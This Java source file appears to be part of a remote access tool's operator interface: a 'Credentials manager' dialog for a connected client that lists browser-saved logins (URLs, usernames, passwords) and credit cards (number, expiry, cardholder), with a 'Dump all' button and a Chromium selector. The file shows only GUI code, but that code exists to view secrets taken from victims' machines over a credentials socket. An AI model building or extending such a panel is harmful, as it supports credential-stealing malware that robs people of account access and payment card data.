package GUI.TableUtils.Credentials;

import Connections.ClientHandler;
import Connections.Streams;
import GUI.Main;
import GUI.TableUtils.Configuration.SocketType;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;

public class CredentialsManagerGUI {
    private final JDialog credentialsManagerDialog;
    private final ClientHandler clientHandler;
    private DefaultTableModel accountsTableModel;

    private DefaultTableModel creditCardsTableModel;
    private JButton dumpAllJButton;


    private final Streams stream;

    public CredentialsManagerGUI(ClientHandler clientHandler) {
        stream = clientHandler.getStreamByName(SocketType.CREDENTIALS);
        credentialsManagerDialog = new JDialog(Main.gui.getMainGUI(), "Credentials manager - " + clientHandler.getIdentifier());
        this.clientHandler = clientHandler;
        credentialsManagerDialog.setLayout(new GridBagLayout());
        credentialsManagerDialog.setSize(750, 300);
        credentialsManagerDialog.setLocationRelativeTo(null);
        addComponents();
        credentialsManagerDialog.setVisible(true);
    }

    private void addComponents() {
        GridBagConstraints constraints = new GridBagConstraints();

        JTabbedPane tabbedPane = new JTabbedPane();

        String[] accountTableColumns = {"Origin URL", "Action URL", "Username", "Password", "Creation date", "Last used date"};
        accountsTableModel = new DefaultTableModel(accountTableColumns, 0);
        JTable accountJTable = new JTable(accountsTableModel);
        JScrollPane accountScrollPane = new JScrollPane(accountJTable);

        String[] creditCardTableColumns = {"Credit card number", "Expiration month", "Expiration year", "Cardholder"};
        creditCardsTableModel = new DefaultTableModel(creditCardTableColumns, 0);
        JTable creditCardsJTable = new JTable(creditCardsTableModel);
        JScrollPane creditCardsScrollPane = new JScrollPane(creditCardsJTable);

        tabbedPane.addTab("Accounts", accountScrollPane);
        tabbedPane.addTab("Credit cards", creditCardsScrollPane);

        constraints.gridx = 0;
        constraints.gridy = 0;
        constraints.gridwidth = 4;
        constraints.gridheight = 1;
        constraints.weightx = 1.0;
        constraints.weighty = 1.0;
        constraints.fill = GridBagConstraints.BOTH;

        credentialsManagerDialog.add(tabbedPane, constraints);

        // Configuración de los botones, como antes
        // ...

        dumpAllJButton = new JButton("Dump all");
        constraints.gridwidth = 1;
        constraints.weighty = 0.0;
        constraints.gridy = 1;

        constraints.gridx = 0;
        dumpAllJButton.addActionListener(new DumpAllAction(this));
        credentialsManagerDialog.add(dumpAllJButton, constraints);

        JComboBox<String> myComboBox = new JComboBox<>();
        myComboBox.addItem("Chromium");

        constraints.gridx = 3;
        credentialsManagerDialog.add(myComboBox, constraints);
    }

    public DefaultTableModel getAccountsTableModel() {
        return accountsTableModel;
    }

    public JButton getDumpAllJButton() {
        return dumpAllJButton;
    }

    public Streams getStream() {
        return stream;
    }

    public ClientHandler getClientHandler() {
        return clientHandler;
    }

    public JDialog getCredentialsManagerDialog() {
        return credentialsManagerDialog;
    }

    public DefaultTableModel getCreditCardsTableModel() {
        return creditCardsTableModel;
    }
}

